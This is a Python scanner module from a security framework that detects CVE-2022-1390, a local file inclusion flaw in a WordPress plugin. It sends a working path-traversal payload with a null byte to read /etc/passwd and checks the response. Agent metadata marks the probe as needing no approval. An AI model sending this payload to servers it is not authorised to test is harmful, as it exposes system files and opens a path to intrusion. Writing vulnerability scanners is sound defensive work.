#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attacke."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Admin Word Count Column 2.2 - Local File Inclusion Detection',
        'description': 'The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attackers to read arbitrary files on server running old version of PHP susceptible to the null byte technique. This could also lead to RCE by using a Phar Deserialization technique.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'packetstorm',
            'wpscan',
            'wordpress',
            'wp-plugin',
            'lfi',
            'wp',
            'admin_word_count_column_project',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/166476/WordPress-Admin-Word-Count-Column-2.2-Local-File-Inclusion.html',
            'https://wordpress.org/plugins/admin-word-count-column/',
            'https://wpscan.com/vulnerability/6293b319-dc4f-4412-9d56-55744246c990',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1390',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-1390',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress Admin Word Count Column 2.2 - Local File Inclusion detected",
                path='/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0',
            )
            return True
        return False

